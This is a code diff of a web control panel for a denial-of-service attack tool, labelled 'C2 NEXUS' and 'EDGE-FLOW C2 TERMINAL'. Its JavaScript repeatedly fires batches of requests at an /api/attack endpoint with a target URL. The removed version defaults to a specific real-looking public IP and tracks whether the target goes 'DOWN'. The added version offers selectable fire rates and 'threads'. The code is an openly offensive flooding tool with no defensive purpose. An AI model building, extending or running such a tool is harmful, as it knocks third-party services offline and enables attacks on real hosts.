@@ -2,142 +2,123 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☢️ EDGE-FLOW v13.0 STREAM</title>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <title>⚡ VERCEL EDGE COMMANDER</title>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; --panel: #111; --border: #222; --warn: #ff0000; }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'JetBrains Mono', monospace; }
-        body { background: var(--bg); color: var(--neon); margin: 0; padding: 10px; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-        
-        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--neon); padding-bottom: 5px; margin-bottom: 10px; }
-        .control-box { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; padding: 15px; margin-bottom: 10px; }
-        
-        input { background: #000; border: 1px solid var(--border); color: var(--neon); padding: 12px; width: 100%; border-radius: 5px; font-size: 1.1em; margin-bottom: 10px; outline: none; text-align: center; }
-        
-        /* 화력 조절 레버 느낌의 버튼 */
-        #streamBtn { background: var(--neon); color: #000; width: 100%; padding: 20px; font-size: 1.3em; font-weight: 900; border: none; border-radius: 5px; cursor: pointer; transition: 0.2s; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
-        #streamBtn.active { background: var(--warn); color: #fff; box-shadow: 0 0 20px rgba(255,0,0,0.4); animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
-
-        .dashboard { flex-grow: 1; display: grid; grid-template-rows: auto 1fr 1fr; gap: 10px; }
-        .stat-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .stat-card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 10px; text-align: center; }
-        .chart-container { background: #000; border: 1px solid var(--border); border-radius: 8px; position: relative; min-height: 120px; }
-        .label { position: absolute; top: 5px; left: 10px; font-size: 0.7em; color: #555; }
+        :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
+        .full-width { grid-column: span 2; }
+        label { display: block; margin-bottom: 5px; font-size: 0.8em; color: #888; }
+        input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; box-sizing: border-box; font-size: 1.1em; outline: none; }
+        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
+        button { flex: 1; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; font-size: 1em; }
+        #startBtn { background: var(--neon); color: #000; }
+        #stopBtn { background: var(--warn); color: #fff; opacity: 0.5; cursor: not-allowed; }
+        #startBtn:hover { box-shadow: 0 0 20px var(--neon); }
+        #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; border-radius: 5px; box-shadow: inset 0 0 10px #000; }
+        .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; animation: scan 0.2s ease-out; }
+        .log-err { color: var(--warn); border-left-color: var(--warn); }
+        @keyframes scan { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+        .stats { display: flex; justify-content: space-between; margin-top: 10px; font-size: 0.9em; color: #888; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h2 style="margin:0">C2 NEXUS v13.0</h2>
-        <div id="status">[WAITING]</div>
-    </div>
-
-    <div class="control-box">
-        <input type="text" id="target" value="http://116.33.6.26/" placeholder="TARGET IP">
-        <button id="streamBtn" onclick="toggleStream()">STREAM START</button>
-    </div>
-
-    <div class="dashboard">
-        <div class="stat-row">
-            <div class="stat-card">
-                <div style="font-size:0.6em; color:#666">TOTAL PAYLOAD</div>
-                <div id="totalVal" style="font-size:1.5em; font-weight:bold">0</div>
-            </div>
-            <div class="stat-card">
-                <div style="font-size:0.6em; color:#666">STREAM LATENCY</div>
-                <div id="latVal" style="font-size:1.5em; font-weight:bold">--</div>
-            </div>
-        </div>
-
-        <div class="chart-container">
-            <span class="label">SUSTAINED FIREPOWER (PPS)</span>
-            <canvas id="pChart"></canvas>
-        </div>
-        <div class="chart-container">
-            <span class="label">TARGET STABILITY (MS)</span>
-            <canvas id="lChart"></canvas>
+        <h1>[ EDGE-FLOW C2 TERMINAL v3.5 ]</h1>
+        <div class="stats">
+            <span>STATUS: <span id="statusText">READY</span></span>
+            <span>TOTAL SHOTS: <span id="shotCount">0</span></span>
         </div>
     </div>
+
+    <div class="controls">
+        <div class="full-width">
+            <label>TARGET ADDRESS (URL/IP)</label>
+            <input type="text" id="target" value="http://" placeholder="http://1.2.3.4">
+        </div>
+        <div>
+            <label>FIRE RATE (INTERVAL ms)</label>
+            <select id="rate">
+                <option value="500">Normal (500ms)</option>
+                <option value="200">Fast (200ms)</option>
+                <option value="100" selected>Turbo (100ms)</option>
+                <option value="50">INSANE (50ms)</option>
+            </select>
+        </div>
+        <div>
+            <label>POWER (THREADS)</label>
+            <select id="threads">
+                <option value="1">Low (1x)</option>
+                <option value="5">Medium (5x)</option>
+                <option value="10" selected>High (10x)</option>
+            </select>
+        </div>
+    </div>
+
+    <div class="btn-group">
+        <button id="startBtn" onclick="initiate()">MISSION START</button>
+        <button id="stopBtn" onclick="terminate()">EMERGENCY STOP</button>
+    </div>
+
+    <div id="terminal">>> SYSTEM INITIALIZED... WAITING FOR TARGET...</div>
 
     <script>
-        let streaming = false, total = 0, last = 0, pChart, lChart;
+        let attackInterval = null;
+        let totalShots = 0;
 
-        window.onload = () => {
-            pChart = initChart('pChart', '#00ff41');
-            lChart = initChart('lChart', '#f0f000');
-            setInterval(() => {
-                if(streaming) {
-                    const pps = total - last;
-                    updateChart(pChart, pps);
-                    last = total;
-                    autoRecon(); // 스트리밍 중 실시간 체크
+        function log(msg, isError = false) {
+            const term = document.getElementById('terminal');
+            const div = document.createElement('div');
+            div.className = `log-entry ${isError ? 'log-err' : ''}`;
+            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            term.prepend(div);
+            if (term.childNodes.length > 50) term.removeChild(term.lastChild);
+        }
+
+        async function initiate() {
+            const target = document.getElementById('target').value;
+            const rate = parseInt(document.getElementById('rate').value);
+            const threads = parseInt(document.getElementById('threads').value);
+
+            if (!target.startsWith('http')) {
+                log("ERROR: INVALID TARGET PROTOCOL", true);
+                return;
+            }
+
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('startBtn').style.opacity = "0.5";
+            document.getElementById('stopBtn').disabled = false;
+            document.getElementById('stopBtn').style.opacity = "1";
+            document.getElementById('statusText').innerText = "FIRING...";
+            document.getElementById('statusText').style.color = "red";
+
+            log(`INITIATING ATTACK ON ${target}...`);
+            log(`MODE: ${threads} THREADS / ${rate}ms INTERVAL`);
+
+            attackInterval = setInterval(() => {
+                for(let i=0; i < threads; i++) {
+                    fetch(`/api/attack?target=${target}`)
+                        .then(res => res.text())
+                        .then(data => {
+                            totalShots += 1000;
+                            document.getElementById('shotCount').innerText = totalShots.toLocaleString();
+                            log(`SUCCESS: 1,000 PKTS DELIVERED`);
+                        })
+                        .catch(e => log("PACKET DROPPED (TARGET BUSY)", true));
                 }
-            }, 1000);
-        };
-
-        function initChart(id, color) {
-            return new Chart(document.getElementById(id), {
-                type: 'line',
-                data: { labels: Array(30).fill(''), datasets: [{ data: Array(30).fill(0), borderColor: color, borderWidth: 2, tension: 0.4, fill: true, backgroundColor: color+'05', pointRadius: 0 }] },
-                options: { responsive: true, maintainAspectRatio: false, animation: false, scales: { y: { display: false }, x: { display: false } }, plugins: { legend: { display: false } } }
-            });
+            }, rate);
         }
 
-        function updateChart(chart, val) {
-            chart.data.datasets[0].data.push(val);
-            chart.data.datasets[0].data.shift();
-            chart.update('none');
-        }
-
-        // [핵심] 화력을 잘게 쪼개서 무한 전송하는 엔진
-        function streamAttack() {
-            if(!streaming) return;
-            const url = document.getElementById('target').value;
-            
-            // 한 번에 10개씩만, 하지만 아주 빠르게(20ms 간격) 보냄
-            for(let i=0; i<10; i++) {
-                fetch(`/api/attack?target=${encodeURIComponent(url)}&ts=${Date.now()}`)
-                .then(() => { total += 12000; document.getElementById('totalVal').innerText = total.toLocaleString(); })
-                .catch(() => {});
-            }
-            
-            // 0.02초마다 재실행하여 끊김 없는 스트림 형성
-            setTimeout(streamAttack, 20);
-        }
-
-        async function autoRecon() {
-            const url = document.getElementById('target').value;
-            const s = Date.now();
-            try {
-                await fetch(url, { mode: 'no-cors', cache: 'no-store' });
-                const ms = Date.now() - s;
-                document.getElementById('latVal').innerText = ms + "ms";
-                updateChart(lChart, ms);
-            } catch(e) {
-                const ms = Date.now() - s;
-                document.getElementById('latVal').innerText = ms > 3000 ? "DOWN" : ms + "ms";
-                updateChart(lChart, ms > 3000 ? 3000 : ms);
-            }
-        }
-
-        function toggleStream() {
-            const btn = document.getElementById('streamBtn');
-            const status = document.getElementById('status');
-            streaming = !streaming;
-            
-            if(streaming) {
-                btn.innerText = "STREAMING...";
-                btn.classList.add('active');
-                status.innerText = "[ACTIVE]";
-                status.style.color = "var(--warn)";
-                streamAttack();
-            } else {
-                btn.innerText = "STREAM START";
-                btn.classList.remove('active');
-                status.innerText = "[WAITING]";
-                status.style.color = "var(--neon)";
-            }
+        function terminate() {
+            clearInterval(attackInterval);
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('startBtn').style.opacity = "1";
+            document.getElementById('stopBtn').disabled = true;
+            document.getElementById('stopBtn').style.opacity = "0.5";
+            document.getElementById('statusText').innerText = "READY";
+            document.getElementById('statusText').style.color = "var(--neon)";
+            log("!!! MISSION TERMINATED BY OPERATOR !!!", true);
         }
     </script>
 </body>
